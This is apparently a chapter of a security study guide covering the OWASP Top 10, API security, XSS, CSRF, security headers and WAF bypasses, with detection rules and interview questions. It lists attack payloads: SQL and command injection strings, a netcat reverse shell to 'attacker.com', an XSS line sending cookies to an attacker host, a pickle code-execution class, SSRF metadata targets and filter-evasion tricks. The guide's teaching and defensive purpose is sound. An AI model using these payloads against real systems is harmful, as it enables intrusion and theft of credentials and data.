# 12 - Web & API Security
## OWASP Top 10, API Security, Common Vulnerabilities

---

## OWASP Top 10 (2021) - Quick Reference

```
┌────┬────────────────────────────────────┬─────────────────────────────────┐
│ #  │ Vulnerability                      │ Key Detection/Prevention        │
├────┼────────────────────────────────────┼─────────────────────────────────┤
│ A01│ Broken Access Control              │ IDOR, privilege escalation,     │
│    │                                    │ missing function-level checks   │
├────┼────────────────────────────────────┼─────────────────────────────────┤
│ A02│ Cryptographic Failures             │ Weak TLS, plaintext secrets,    │
│    │                                    │ weak hashing, hardcoded keys    │
├────┼────────────────────────────────────┼─────────────────────────────────┤
│ A03│ Injection (SQL, NoSQL, OS, LDAP)   │ Parameterized queries, input    │
│    │                                    │ validation, WAF rules           │
├────┼────────────────────────────────────┼─────────────────────────────────┤
│ A04│ Insecure Design                    │ Threat modeling, secure SDLC,   │
│    │                                    │ security requirements           │
├────┼────────────────────────────────────┼─────────────────────────────────┤
│ A05│ Security Misconfiguration          │ Default creds, verbose errors,  │
│    │                                    │ unnecessary features enabled    │
├────┼────────────────────────────────────┼─────────────────────────────────┤
│ A06│ Vulnerable Components              │ Outdated libraries, SCA tools,  │
│    │                                    │ dependency scanning             │
├────┼────────────────────────────────────┼─────────────────────────────────┤
│ A07│ Identification & Auth Failures     │ Weak passwords, session fixation│
│    │                                    │ credential stuffing, no MFA     │
├────┼────────────────────────────────────┼─────────────────────────────────┤
│ A08│ Software & Data Integrity Failures │ Insecure deserialization,       │
│    │                                    │ CI/CD pipeline attacks          │
├────┼────────────────────────────────────┼─────────────────────────────────┤
│ A09│ Security Logging & Monitoring      │ Insufficient logging, no        │
│    │                                    │ alerting, missing audit trails  │
├────┼────────────────────────────────────┼─────────────────────────────────┤
│ A10│ Server-Side Request Forgery (SSRF) │ URL validation, allowlists,     │
│    │                                    │ network segmentation            │
└────┴────────────────────────────────────┴─────────────────────────────────┘
```

---

## A01 - Broken Access Control

```
COMMON ISSUES:
├── IDOR (Insecure Direct Object Reference)
│   GET /api/users/123 → Change to /api/users/124
├── Missing Function Level Access Control
│   User accesses /admin/deleteUser
├── Privilege Escalation
│   Modify role in request body: {"role": "admin"}
├── JWT Manipulation
│   Modify claims, alg:none attack
└── Path Traversal
│   GET /files?name=../../../etc/passwd

DETECTION:
# WAF rule for IDOR attempts
SecRule ARGS "@rx ^[0-9]+$" "id:1001,phase:2,log,msg:'Possible IDOR',\
    chain"
SecRule REQUEST_METHOD "@streq GET"

# Splunk - Access to unauthorized resources
index=app_logs status=403
| stats count by user, endpoint
| where count > 10
```

---

## A03 - Injection

```
SQL INJECTION:
# Classic
' OR '1'='1
' UNION SELECT username,password FROM users--
'; DROP TABLE users;--

# Blind (Time-based)
'; WAITFOR DELAY '0:0:5'--
' AND SLEEP(5)--

# Error-based
' AND 1=CONVERT(int,@@version)--

COMMAND INJECTION:
; cat /etc/passwd
| whoami
`id`
$(whoami)
; nc -e /bin/sh attacker.com 4444

NOSQL INJECTION (MongoDB):
{"username": {"$ne": ""}, "password": {"$ne": ""}}
{"username": "admin", "password": {"$gt": ""}}

LDAP INJECTION:
*)(uid=*))(|(uid=*
admin)(&)
*)(objectClass=*)

DETECTION PATTERNS:
# SQL Injection signatures
(?i)(union\s+select|select\s+.*\s+from|insert\s+into|delete\s+from|
    drop\s+table|update\s+.*\s+set|'--|\bor\b.*=.*\bor\b)

# Command injection
[;&|`$]|\b(cat|ls|whoami|id|nc|curl|wget|bash|sh)\b
```

---

## A08 - Insecure Deserialization

```
JAVA SERIALIZATION:
# Magic bytes: AC ED 00 05 (or rO0 in base64)
# Tools: ysoserial, marshalsec

Payload: rO0ABXNyAC...

PYTHON PICKLE:
import pickle
class Exploit:
    def __reduce__(self):
        return (os.system, ('whoami',))
pickle.dumps(Exploit())

PHP UNSERIALIZE:
O:8:"stdClass":1:{s:4:"test";s:4:"data";}

.NET VIEWSTATE:
# Check for __VIEWSTATE parameter
# Tools: ysoserial.net

DETECTION:
# Java serialization in HTTP
index=proxy http_body="*rO0AB*" OR http_body="*aced0005*"

# Sysmon - Exploitation aftermath
index=sysmon EventCode=1 ParentImage="*java*" OR ParentImage="*tomcat*"
| where Image IN ("*cmd.exe*","*powershell*","*bash*")
```

---

## A10 - SSRF (Server-Side Request Forgery)

```
ATTACK VECTORS:
# Cloud metadata endpoints
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/
http://169.254.169.254/metadata/v1/

# Internal network scanning
http://192.168.1.1/admin
http://localhost:6379 (Redis)
http://127.0.0.1:3306 (MySQL)

# Protocol smuggling
gopher://localhost:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a
dict://localhost:6379/info

# Bypasses
http://127.1
http://0.0.0.0
http://[::1]
http://2130706433 (decimal IP)
http://0x7f.0x0.0x0.0x1 (hex IP)
http://127.0.0.1.nip.io

DETECTION:
# CloudTrail - Metadata access from EC2
index=cloudtrail eventName="GetMetadataToken" OR eventName="PutParameter"
| where sourceIPAddress="169.254.169.254"

# WAF - SSRF patterns
SecRule ARGS "@rx (169\.254\.169\.254|metadata\.google|localhost|127\.0\.0\.1)" \
    "id:1010,phase:2,deny,log,msg:'SSRF Attempt'"
```

---

## OWASP API Security Top 10 (2023)

```
┌────┬─────────────────────────────────────┬─────────────────────────────────┐
│ #  │ Vulnerability                       │ Example                         │
├────┼─────────────────────────────────────┼─────────────────────────────────┤
│ 1  │ Broken Object Level Auth (BOLA)     │ GET /api/users/123 → 124        │
│ 2  │ Broken Authentication               │ Weak tokens, no rate limiting   │
│ 3  │ Broken Object Property Level Auth   │ Mass assignment, data exposure  │
│ 4  │ Unrestricted Resource Consumption   │ No pagination, memory exhaustion│
│ 5  │ Broken Function Level Auth (BFLA)   │ POST /api/admin/users           │
│ 6  │ Unrestricted Access to Sensitive    │ GET /api/users returns all data │
│    │ Business Flows                      │                                 │
│ 7  │ Server Side Request Forgery         │ URL parameters fetch internal   │
│ 8  │ Security Misconfiguration           │ Verbose errors, CORS *          │
│ 9  │ Improper Inventory Management       │ Deprecated APIs still active    │
│ 10 │ Unsafe Consumption of APIs          │ Trusting third-party API data   │
└────┴─────────────────────────────────────┴─────────────────────────────────┘
```

---

## XSS (Cross-Site Scripting)

```
TYPES:
Reflected: <script>alert(document.cookie)</script>
Stored: Saved in DB, rendered to other users
DOM-based: Client-side JS vulnerability

PAYLOADS:
# Basic
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>

# Event handlers
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>

# Filter bypass
<ScRiPt>alert('XSS')</sCrIpT>
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror="&#x61;lert('XSS')">

# Cookie stealing
<script>new Image().src="http://attacker/steal?c="+document.cookie</script>

PREVENTION:
- Content-Security-Policy header
- X-XSS-Protection: 1; mode=block
- HttpOnly cookies
- Input validation + output encoding
- DOM sanitization (DOMPurify)
```

---

## CSRF (Cross-Site Request Forgery)

```
ATTACK:
<form action="https://bank.com/transfer" method="POST" id="form">
    <input type="hidden" name="to" value="attacker">
    <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('form').submit();</script>

PREVENTION:
- CSRF tokens (synchronizer token pattern)
- SameSite=Strict cookies
- Check Origin/Referer headers
- Double submit cookie pattern
- Custom request headers (for APIs)

DETECTION:
# Missing referer for sensitive actions
index=app_logs http_method=POST endpoint="/api/transfer"
| where isnull(http_referer) OR NOT match(http_referer, "bank\.com")
```

---

## Security Headers Reference

```http
# Essential headers
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=(), microphone=()

# Cookie security
Set-Cookie: session=abc; Secure; HttpOnly; SameSite=Strict; Path=/

# CORS (be restrictive)
Access-Control-Allow-Origin: https://trusted.com
Access-Control-Allow-Methods: GET, POST
Access-Control-Allow-Credentials: true
```

---

## WAF Bypass Techniques (Know Your Enemy)

```
# URL encoding
%27%20OR%20%271%27=%271

# Double encoding
%252f (becomes %2f → /)

# Unicode
' OR '1'='1  →  ＇ OR ＇1＇=＇1

# Case variation
sElEcT * fRoM users

# Comments
SEL/**/ECT * FROM users

# Null bytes
SELECT%00 * FROM users

# HTTP Parameter Pollution
?id=1&id=2 (which value is used?)

# Chunked encoding
Transfer-Encoding: chunked

# Content-type mismatch
POST with application/json but send XML

DETECTION:
Monitor for:
- High volume of 403s from single IP
- Encoded/obfuscated parameters
- Requests with unusual character sets
- Multiple encoding layers
```

---

## Interview Questions - Web Security

1. **Walk through exploiting an SSRF vulnerability**
   - Find URL parameter, test for internal access
   - Bypass filters (IP encoding, DNS rebinding)
   - Target metadata endpoints for cloud creds
   - Pivot to internal services

2. **How do you detect SQL injection attacks?**
   - WAF signatures for SQL syntax
   - Error message patterns in responses
   - Time-based detection (slow queries)
   - Application logs showing exceptions
   - Database query logs

3. **Explain the difference between XSS types**
   - Reflected: In URL, immediate execution
   - Stored: In database, affects other users
   - DOM: Client-side JS vulnerability
   - Mutation XSS: Exploits sanitizer bugs

4. **How would you secure a REST API?**
   - OAuth 2.0 + JWT (short-lived tokens)
   - Rate limiting per endpoint
   - Input validation + output encoding
   - Object-level authorization checks
   - Security headers (CSP, HSTS)
   - API gateway + WAF

---

**Next: [13_AI_ML_SECURITY.md](./13_AI_ML_SECURITY.md) →**
